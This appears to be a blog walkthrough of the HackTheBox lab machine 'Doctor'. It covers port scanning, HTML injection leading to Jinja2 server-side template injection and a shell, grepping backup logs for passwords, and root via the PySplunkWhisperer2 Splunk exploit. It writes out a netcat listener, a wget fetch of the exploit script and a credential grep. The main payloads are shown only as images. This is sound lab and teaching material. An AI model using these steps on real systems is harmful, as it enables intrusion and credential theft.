--- 
titile: Doctor Machine 
author: Software User
date: 2021-02-13 16:31:00 +0800
category: hackthebox
tags: [htb-machines,htb,doctor,ssti,htb]
--- 

![Desktop View]({{ "/assets/img/htb-machines/doctor/1.png" | relative_url }})

--- 

<strong><span style="color:#06bf04">Introduction</span></strong>



Doctor is easy level machine released on 26 September2020 on HacTheBox and created by [egotisticalSW](https://www.hackthebox.eu/home/users/profile/94858)

<span style="color:#06bf04">The blog is for educational purposes only.</span>


---

<strong ><span style="color:#06bf04">Enumeration</span></strong>

<strong><span style="color:#06bf04">IP-: 10.10.10.209</span></strong>

As always, I added IP In hosts file.

Lets start with Port Scanning
---
# Nmap 

<p><code class="language-plaintext highlighter-rouge">softwareuser@parrot:~ sudo nmap -sC -sS -sV -T4 -A -oN nmap/intial_scan doctor.htb </code></p>

![Desktop View]({{ "/assets/img/htb-machines/doctor/2.png" | relative_url }})

<strong>-sC for default scripts</strong><br>
<strong>-sV for Version detection</strong><br>
<strong>-sS for SYN scan </strong><br>
<strong>-T4 for speeding up Scan</strong><br>
<strong>-A  for Advanced and Aggressive features</strong><br> 
<strong>-oN for Output</strong><br>

---

<strong>lnmap is just my alias to print only open ports from result file
</strong>

```markdown

22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
8089/tcp open  ssl/http Splunkd httpd
```

# Web Page
 
A simple web page and links aren't working

![Desktop View]({{ "/assets/img/htb-machines/doctor/3.png" | relative_url }})

but we got a subdomain 

![Desktop View]({{ "/assets/img/htb-machines/doctor/4.png " | relative_url }})

let's add this domain to our hosts (/etc/hosts) file  


```markdown
Send us a message
info@doctors.htb
```


# doctors.htb 

A Login and Register page 

![Desktop View]({{ "/assets/img/htb-machines/doctor/5.png" | relative_url }})

Let's register 

![Desktop View]({{ "/assets/img/htb-machines/doctor/6.png" | relative_url }})

Let's Login with email and password that we used to register

![Desktop View]({{ "/assets/img/htb-machines/doctor/7.png" | relative_url }})

Nothing it's blank lets source-code and i found something linked with /archive

![Desktop View]({{ "/assets/img/htb-machines/doctor/8.png" | relative_url }})

```markdown
<!--archive still under beta testing<a class="nav-item nav-link" href="/archive">Archive</a>-->

```

Let's check /archive

![Desktop View]({{ "/assets/img/htb-machines/doctor/9.png"  | relative_url }})

/archive is also blank page

but on webpage  we can see  a option of New Message 

![Desktop View]({{ "/assets/img/htb-machines/doctor/10.png" | relative_url }})

Let's Try to post a message with `<h1>` tag 

![Desktop View]({{ "/assets/img/htb-machines/doctor/11.png" | relative_url }})

and we get a response your post has been created

![Desktop View]({{ "/assets/img/htb-machines/doctor/12.png" | relative_url }})

we can try to check it on /archive

![Desktop View]({{ "/assets/img/htb-machines/doctor/13.png" | relative_url }})

as we can see our message is there  and on this point i was sure that i have to work bit more and i can execute command or payload at /archive lets try some other tags too

![Desktop View]({{ "/assets/img/htb-machines/doctor/14.png" | relative_url }})

Let's post this Message

![Desktop View]({{ "/assets/img/htb-machines/doctor/15.png" | relative_url }})

```markdown

</title></item><h1>software</h1>
</title></item><h1>user</h1>
```

it worked 

![Desktop View]({{ "/assets/img/htb-machines/doctor/16.png "| relative_url }})

source code 

![Desktop View]({{ "/assets/img/htb-machines/doctor/17.png" | relative_url }})


it's vunlreable by SSTI(Server-Side Template Injection) Server-side template injection is when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side. Read More about [SSTI](https://portswigger.net/web-security/server-side-template-injection)

we have to identify which template is web page using so  a picture from this [article](https://portswigger.net/research/server-side-template-injection) explains everything easily 

![Desktop View]({{ "/assets/img/htb-machines/doctor/18.png" | relative_url }})

so i started trying every payload to find out which template is web app using 
and finally i found thats Jinja2 with this payload ` curly bracket curly bracket 5*apostrophe5apostrophe  curly bracket curly bracket ` for more about check this [jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) let's try other payload to confirm that is jinja2 hehe

![Desktop View]({{ "/assets/img/htb-machines/doctor/19.png" | relative_url }})

let's check /archive again 

![Desktop View]({{ "/assets/img/htb-machines/doctor/20.png" | relative_url }})

thats working now i have to Exploit the SSTI by calling Popen without guessing the offset

![Desktop View]({{ "/assets/img/htb-machines/doctor/21.png" | relative_url }})

# Payload

![Desktop View]({{ "/assets/img/htb-machines/doctor/payload.png" | relative_url }})  

Let's create a new message with payload 

![Desktop View]({{ "/assets/img/htb-machines/doctor/22.png" | relative_url }})

Let's post Message

![Desktop View]({{ "/assets/img/htb-machines/doctor/23.png" | relative_url }})

now let's access the /archive we got a shell as web@doctor

![Desktop View]({{ "/assets/img/htb-machines/doctor/24.png" | relative_url }})

# Web (Shell)

we don't have permission to read user.txt we have tp enumerate more after some time i found some log files but there is an backup so i found creds in that file of probably user shaun because shaun contains our user.txt 

```markdown
cat backup | grep -iE "password" 
``` 

![Desktop View]({{ "/assets/img/htb-machines/doctor/25.png" | relative_url }})



got user

![Desktop View]({{ "/assets/img/htb-machines/doctor/26.png" | relative_url }})

# Root Part 

As always i will run [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) after running linPEAS i found splunk is running

![Desktop View]({{ "/assets/img/htb-machines/doctor/27.png" | relative_url }})
<!-- ![Desktop View]({{ "/assets/img/htb-machines/doctor/27.png" | relative_url }}) -->

Splunk forwarder is one of the components of splunk infrastructure. Splunk forwarder basically acts as agent for log collection from remote machines .Splunk forwarder collects logs from remote machines and forward s them to indexer (Splunk database) for further processing and storage. Read more about splunk here [splunk](https://www.learnsplunk.com/splunk-forwarder-install.html)

![Desktop View]({{ "/assets/img/htb-machines/doctor/splunk-py.png"}})

After googling i found an script which can be used here for privilege escalation [PySplunkWhisperer2](https://github.com/DaniloCaruso/SplunkWhisperer2/tree/master/PySplunkWhisperer2)

# PySplunkWhisperer2
--- 

we have to start a netcat listener and then we have to run PySplunkWhisperer2 on our system

```

nc -lnvp 5006 # you'r machine
python3 -m http.server 80 # you'r machine
wget http://10.10.xx.xxx:80/PySplunkWhisperer2_remote.py # your machine

```


Let's run netcat listener 


![Desktop View]({{ "/assets/img/htb-machines/doctor/29.png" | relative_url }})

Let's run PySplunkWhisperer2 to get shell 

![Desktop View]({{ "/assets/img/htb-machines/doctor/30.png" | relative_url }})

payload 


![Desktop View]({{ "/assets/img/htb-machines/doctor/mainp.png" | relative_url }})

we got a shell   

![Desktop View]({{ "/assets/img/htb-machines/doctor/31.png" relative_url }})

now we can read root.txt 

![Desktop View]({{ "/assets/img/htb-machines/doctor/32.png" relative_url }})

Thank you for reading my blog if you have any suggestions feel free to contact me on [twitter](https://twitter.com/softwareuser_).

---